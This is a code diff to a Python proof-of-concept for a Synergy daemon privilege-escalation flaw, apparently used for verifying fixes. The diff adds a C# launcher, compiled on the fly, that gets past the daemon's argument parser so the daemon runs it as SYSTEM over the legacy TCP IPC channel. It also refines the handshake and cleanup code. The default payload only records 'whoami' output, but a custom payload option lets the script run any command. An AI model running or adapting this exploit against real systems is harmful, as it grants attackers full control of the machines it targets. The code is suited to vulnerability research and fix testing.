@@ -58,6 +58,7 @@ import os
 import socket
 import struct
 import sys
+import tempfile
 import time
 
 PIPE_NAME = "synergy-daemon"
@@ -325,6 +326,85 @@ def pipe_query_log_path():
     return None
 
 
+_CSHARP_LAUNCHER_SRC = r"""
+using System;
+using System.Diagnostics;
+using System.IO;
+
+class Launcher {
+    static int Main(string[] args) {
+        // Trailing positional from parseClientArgs is the evidence path.
+        // Everything else (e.g. `--debug DEBUG`) is ignored.
+        if (args.Length == 0) return 1;
+        string evidence = args[args.Length - 1];
+        var psi = new ProcessStartInfo("cmd.exe", "/c whoami /all") {
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true,
+        };
+        using (var p = Process.Start(psi)) {
+            string output = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+            File.WriteAllText(evidence, output);
+        }
+        return 0;
+    }
+}
+"""
+
+
+def _find_csc():
+    """Locate csc.exe from .NET Framework. 64-bit preferred for parity with daemon."""
+    candidates = [
+        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
+        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
+        r"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
+        r"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
+    ]
+    for path in candidates:
+        if os.path.exists(path):
+            return path
+    return None
+
+
+def _build_csharp_launcher():
+    """JIT-compile a tiny .NET launcher and return its path (or None on failure).
+
+    The launcher exists to dodge the parseClientArgs/parseGenericArgs paradox:
+    the daemon's parser only accepts a *trailing* unrecognized positional, and
+    `--debug LEVEL` must reach parseGenericArgs to populate m_logFilter (else
+    the IPC handler AVs on `String logLevel(nullptr)`). No built-in Windows
+    binary tolerates `--debug DEBUG` ahead of its real arguments — wscript and
+    cscript treat the first non-`//` token as the script path, cmd refuses to
+    honour `/C` after non-switch garbage, powershell rejects unknown flags.
+    A tiny .NET stub ignores leading junk and consumes the trailing positional.
+    """
+    import subprocess
+    csc = _find_csc()
+    if csc is None:
+        return None
+    src_path = os.path.join(tempfile.gettempdir(), f"synergy_pwner_{os.getpid()}.cs")
+    exe_path = os.path.join(tempfile.gettempdir(), f"synergy_pwner_{os.getpid()}.exe")
+    with open(src_path, "w", encoding="ascii") as f:
+        f.write(_CSHARP_LAUNCHER_SRC)
+    try:
+        result = subprocess.run(
+            [csc, "/nologo", "/target:exe", f"/out:{exe_path}", src_path],
+            capture_output=True, text=True, timeout=30,
+        )
+        if result.returncode != 0:
+            print(f"[!] csc.exe failed (rc={result.returncode}):")
+            print(result.stdout)
+            print(result.stderr)
+            return None
+    finally:
+        try:
+            os.remove(src_path)
+        except OSError:
+            pass
+    return exe_path if os.path.exists(exe_path) else None
+
+
 # ===========================================================================
 # TCP transport (older Synergy: pre-named-pipe-backport, custom binary IPC)
 # ===========================================================================
@@ -362,10 +442,24 @@ class TcpIpcClient:
         self._sock.sendall(b"IHEL" + bytes([TCP_CLIENT_TYPE_GUI]))
 
     def expect_hello_back(self, timeout=2.0):
-        # Daemon writes 'IHEL' (no payload) via kIpcMsgHelloBack.
-        tag = self._recv_exact(4, timeout=timeout)
-        if tag != b"IHEL":
-            raise RuntimeError(f"unexpected hello-back tag: {tag!r}")
+        # IpcLogOutputter runs on its own thread and starts flushing buffered
+        # log lines (ILOG) the moment a GUI connects, so ILOG can beat IHEL
+        # to the wire. Skip ILOG frames until we see the actual hello back.
+        deadline = time.monotonic() + timeout
+        while True:
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                raise TimeoutError("timed out waiting for IHEL hello-back")
+            tag = self._recv_exact(4, timeout=remaining)
+            if tag == b"IHEL":
+                return
+            if tag == b"ILOG":
+                # %s is UInt32-BE length + bytes.
+                length = int.from_bytes(self._recv_exact(4, timeout=remaining), "big")
+                if length:
+                    self._recv_exact(length, timeout=remaining)
+                continue
+            raise RuntimeError(f"unexpected handshake tag: {tag!r}")
 
     def send_command(self, command, elevate):
         # ICMD + UInt32-BE-len + bytes + UInt8 elevate flag.
@@ -508,6 +602,43 @@ def mode_exploit_tcp(payload_exe, evidence_path):
     print("=" * 70)
     print("MODE: exploit (tcp)  —  targets pre-backport Synergy daemon (legacy IPC)")
     print("=" * 70)
+
+    payload_path = None
+    if payload_exe is None and evidence_path is not None:
+        # Two daemon-side gates the payload has to clear simultaneously:
+        #
+        # (a) ArgsBase::m_logFilter must be non-null before
+        #     DaemonApp::handleIpcMessage runs `String logLevel(m_logFilter)`
+        #     — std::string(nullptr) UBs through strlen(NULL) and AVs the
+        #     IPC handler thread before the spawn can fire. Setting
+        #     m_logFilter requires `--debug LEVEL` to be parsed by
+        #     parseGenericArgs, which only happens when parseClientArgs
+        #     reaches that token (i.e. all preceding tokens parse cleanly).
+        #
+        # (b) parseClientArgs's positional handling: only the *last*
+        #     unrecognized token is accepted as the server-address
+        #     positional (`if (i + 1 == argc) m_serverAddress = argv[i]`);
+        #     any earlier unrecognized token returns false at CLOG_CRIT.
+        #     CLOG_CRIT is just a log level, not a hard exit, but if the
+        #     parser bails at argv[1] it never reaches `--debug` and (a)
+        #     fails. So the only command shape that satisfies both is
+        #     `<binary> --debug DEBUG <trailing positional>`.
+        #
+        # Built-in spawn targets fight that shape: wscript/cscript treat
+        # the first non-`//` token as the script path; cmd needs `/C` to
+        # come ahead of any non-switch garbage; powershell rejects
+        # unrecognized leading flags. So we emit a tiny .NET launcher
+        # whose `Main` ignores the leading flags and treats the trailing
+        # positional as a path to write `whoami` output to. csc.exe ships
+        # with .NET Framework on every modern Windows install.
+        payload_path = _build_csharp_launcher()
+        if payload_path is None:
+            print("[!] Could not build C# launcher (csc.exe not found?). Aborting tcp exploit.")
+            return
+        quoted_launcher = f'"{payload_path}"' if " " in payload_path else payload_path
+        quoted_evidence = f'"{evidence_path}"' if " " in evidence_path else evidence_path
+        payload_exe = f"{quoted_launcher} --debug DEBUG {quoted_evidence}"
+
     print(f"Payload: {payload_exe}")
     print("Expected: FAIL — daemon spawns payload as SYSTEM on receipt of ICMD.")
     print("(There is no fix-test for this transport; the fix is the named-pipe rewrite itself.)\n")
@@ -519,34 +650,38 @@ def mode_exploit_tcp(payload_exe, evidence_path):
             pass
 
     print("[*] TCP target: %s:%d" % (TCP_HOST, TCP_PORT))
-    with tcp_connect_and_handshake() as c:
-        print(f"    >> ICMD command={payload_exe!r} elevate=1")
-        c.send_command(payload_exe, elevate=True)
-        # The legacy daemon spawns immediately; there's no ack on this channel.
-        # Give the watchdog a moment to actually create the process.
-        time.sleep(0.5)
+    try:
+        with tcp_connect_and_handshake() as c:
+            print(f"    >> ICMD command={payload_exe!r} elevate=1")
+            c.send_command(payload_exe, elevate=True)
+            time.sleep(0.5)
 
-    if evidence_path is None:
-        _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
-        return
+        if evidence_path is None:
+            _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
+            return
 
-    _wait_for_file(evidence_path, timeout=15.0)
+        _wait_for_file(evidence_path, timeout=15.0)
 
-    if os.path.exists(evidence_path):
-        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
-        try:
-            with open(evidence_path, encoding="utf-8", errors="replace") as f:
-                for line in f.read().splitlines()[:12]:
-                    print(f"         | {line}")
-        except OSError as e:
-            print(f"         !! read failed: {e}")
-        try:
-            os.remove(evidence_path)
-        except OSError:
-            pass
-    else:
-        # Legacy daemon may also have a watchdog backoff window; absence isn't proof of fix.
-        _verdict(None, "no evidence file within 15s — daemon may be in backoff or the command path failed silently. Re-run.")
+        if os.path.exists(evidence_path):
+            _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
+            try:
+                with open(evidence_path, encoding="utf-8", errors="replace") as f:
+                    for line in f.read().splitlines()[:12]:
+                        print(f"         | {line}")
+            except OSError as e:
+                print(f"         !! read failed: {e}")
+            try:
+                os.remove(evidence_path)
+            except OSError:
+                pass
+        else:
+            _verdict(None, "no evidence file within 15s — daemon may be in backoff or the command path failed silently. Re-run.")
+    finally:
+        if payload_path:
+            try:
+                os.remove(payload_path)
+            except OSError:
+                pass
 
 
 # ===========================================================================
@@ -774,7 +909,11 @@ def main():
             payload_exe, evidence_path = args.payload_exe, None
         else:
             evidence_path = rf"C:\Windows\Temp\synergy_privesc_{os.getpid()}.txt"
-            payload_exe = rf'C:\Windows\System32\cmd.exe /c whoami > "{evidence_path}"'
+            if transport == "pipe":
+                payload_exe = rf'C:\Windows\System32\cmd.exe /c whoami > "{evidence_path}"'
+            else:
+                # mode_exploit_tcp builds a .bat to bypass the legacy daemon's argparser.
+                payload_exe = None
         if transport == "pipe":
             mode_exploit_pipe(payload_exe, evidence_path)
         else:
